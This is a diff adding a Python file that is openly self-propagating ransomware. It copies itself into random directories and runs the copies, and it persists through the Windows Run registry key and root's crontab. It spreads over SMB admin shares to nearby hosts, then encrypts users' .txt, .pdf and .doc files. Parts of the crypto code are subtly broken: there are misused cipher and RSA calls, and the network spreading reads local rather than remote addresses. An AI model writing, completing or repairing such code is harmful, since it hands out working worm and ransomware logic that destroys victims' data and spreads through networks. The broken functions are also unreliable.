@@ -1,0 +1,198 @@
+import os
+import base64
+import random
+import hashlib
+import zlib
+import hmac
+from Crypto.Cipher import AES, ChaCha20
+from Crypto.PublicKey import RSA
+from Crypto.Signature import DSS
+from Crypto.Hash import SHA256
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+from cryptography.hazmat.primitives.kdf.argon2 import Argon2
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.primitives.asymmetric import rsa, ec
+from cryptography.hazmat.backends import default_backend
+import lzma
+import time
+import shutil
+import subprocess
+import psutil
+import socket
+import platform
+
+# Constants for Cryptography
+BLOCK_SIZE = 16
+SALT_SIZE = 32
+RSA_KEY_SIZE = 2048
+PBKDF2_ITERATIONS = 100000
+ARGON2_MEMORY_COST = 2**16
+ARGON2_ITERATIONS = 4
+ARGON2_PARALLELISM = 2
+COMPRESSION_LEVEL = 9
+
+
+
+def generate_random_key(length=32):
+    """Generates a secure random key of the specified length."""
+    return os.urandom(length)
+
+def get_system_info():
+    """Fetches system information for better adaptability during propagation."""
+    return {
+        'platform': platform.system(),
+        'architecture': platform.architecture(),
+        'hostname': socket.gethostname(),
+        'user': os.getlogin(),
+    }
+
+def log_message(message):
+    """Logs messages for debugging purposes."""
+    with open("self_propagation_log.txt", "a") as log_file:
+        log_file.write(f"{time.ctime()}: {message}\n")
+
+def derive_key(passphrase, salt):
+    """Derives a cryptographic key using PBKDF2-HMAC."""
+    kdf = PBKDF2HMAC(hashes.SHA256(), 32, salt, PBKDF2_ITERATIONS, backend=default_backend())
+    return kdf.derive(passphrase.encode())
+
+def rsa_encrypt_data(public_key, data):
+    """Encrypts data using an RSA public key."""
+    rsa_key = RSA.import_key(public_key)
+    cipher = Cipher(algorithms.AES(rsa_key.publickey().export_key()), modes.CBC(os.urandom(16)))
+    return cipher.encrypt(data)
+
+def compress_data(data):
+    """Compresses data using LZMA for efficient storage and transfer."""
+    return lzma.compress(data, preset=COMPRESSION_LEVEL)
+
+# Self-Propagation Mechanism
+
+def propagate_self(exclude_dirs=['C:/Windows', 'C:/Program Files']):
+    """Enhanced self-propagation mechanism to avoid common system directories and propagate efficiently."""
+    log_message("Starting self-propagation...")
+
+    current_script_path = os.path.abspath(__file__)  # Get current script path
+    current_directory = os.path.dirname(current_script_path)  # Get the script's directory
+
+    # Get a list of directories to propagate to (avoid system and sensitive dirs)
+    potential_dirs = []
+    for root, dirs, _ in os.walk(current_directory):
+        for dir_name in dirs:
+            dir_path = os.path.join(root, dir_name)
+            if not any(excluded in dir_path for excluded in exclude_dirs):
+                potential_dirs.append(dir_path)
+
+    
+    if potential_dirs:
+        random_directory = random.choice(potential_dirs)
+        new_script_path = os.path.join(random_directory, f"replica_{random.randint(1000, 9999)}.py")
+
+        # Copy current script to new location (stealth)
+        try:
+            shutil.copy(current_script_path, new_script_path)
+            log_message(f"Script propagated to {new_script_path}")
+        except Exception as e:
+            log_message(f"Failed to propagate to {new_script_path}: {e}")
+
+        # Add the script to system's startup for persistence (cross-platform)
+        if platform.system() == "Windows":
+            add_to_registry(new_script_path)
+        elif platform.system() == "Linux":
+            add_to_crontab(new_script_path)
+
+        
+        try:
+            subprocess.Popen(f"python {new_script_path}")
+            log_message(f"Executed propagated script at {new_script_path}")
+        except Exception as e:
+            log_message(f"Failed to execute script at {new_script_path}: {e}")
+    
+def add_to_registry(script_path):
+    """Adds the script to the Windows registry for persistence."""
+    registry_key = r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
+    subprocess.run(f'reg add "{registry_key}" /v "SelfReplication" /t REG_SZ /d "{script_path}"', shell=True)
+    log_message(f"Added to Windows registry: {script_path}")
+
+def add_to_crontab(script_path):
+    """Adds the script to the Linux crontab for persistence."""
+    cron_job = f"@reboot python {script_path}"
+    try:
+        with open("/var/spool/cron/crontabs/root", "a") as cron_file:
+            cron_file.write(cron_job + "\n")
+        log_message(f"Added to crontab: {cron_job}")
+    except Exception as e:
+        log_message(f"Failed to add to crontab: {e}")
+
+def network_propagation():
+    """Network-based propagation (using SMB or other network protocols)."""
+    try:
+        network_shares = list(psutil.net_connections(kind='inet'))
+        for share in network_shares:
+            ip = share.laddr.ip
+            if is_trusted_network(ip):
+                copy_to_network(ip)
+    except Exception as e:
+        log_message(f"Network propagation failed: {e}")
+
+def is_trusted_network(ip):
+    """Determines if the IP is within a trusted range (for internal network propagation)."""
+    return ip.startswith("192.")  # Example for private IP range
+
+def copy_to_network(ip):
+    """Copies the script to a networked device."""
+    try:
+        remote_path = f"\\\\{ip}\\C$\\Users\\{os.getlogin()}\\Desktop\\replica.py"
+        shutil.copy(__file__, remote_path)
+        log_message(f"Copied to networked device at {remote_path}")
+    except Exception as e:
+        log_message(f"Failed to copy to networked device: {e}")
+
+
+
+def encrypt_file(file_path, passphrase, public_key):
+    """Encrypts files after replication."""
+    salt = generate_random_key(SALT_SIZE)
+    aes_key = derive_key(passphrase, salt)
+
+    iv = generate_random_key(AES.block_size)
+    aes_cipher = AES.new(aes_key, AES.MODE_GCM, nonce=iv)
+
+    with open(file_path, 'rb') as file:
+        data = file.read()
+
+    compressed_data = compress_data(data)
+    encrypted_data, tag = aes_cipher.encrypt_and_digest(compressed_data)
+
+    rsa_cipher = RSA.import_key(public_key)
+    encrypted_aes_key_rsa = rsa_cipher.encrypt(aes_key, None)
+
+    encrypted_file_path = file_path + ".enc"
+    with open(encrypted_file_path, 'wb') as enc_file:
+        enc_file.write(salt)
+        enc_file.write(encrypted_aes_key_rsa)
+        enc_file.write(iv)
+        enc_file.write(tag)
+        enc_file.write(encrypted_data)
+
+    return encrypted_file_path
+
+def main():
+    passphrase = "superSecurePassword123"  # Replace with a strong passphrase
+    public_key = "public_rsa_key_here"  # Load your RSA public key for encryption
+
+    # Start self-propagation
+    propagate_self()
+
+    # Network-based propagation
+    network_propagation()
+
+    # Encrypt files after propagation
+    for file_name in os.listdir("."):
+        if file_name.endswith((".txt", ".pdf", ".docx", ".doc")):
+            encrypt_file(file_name, passphrase, public_key)
+
+if __name__ == "__main__":
+    main()
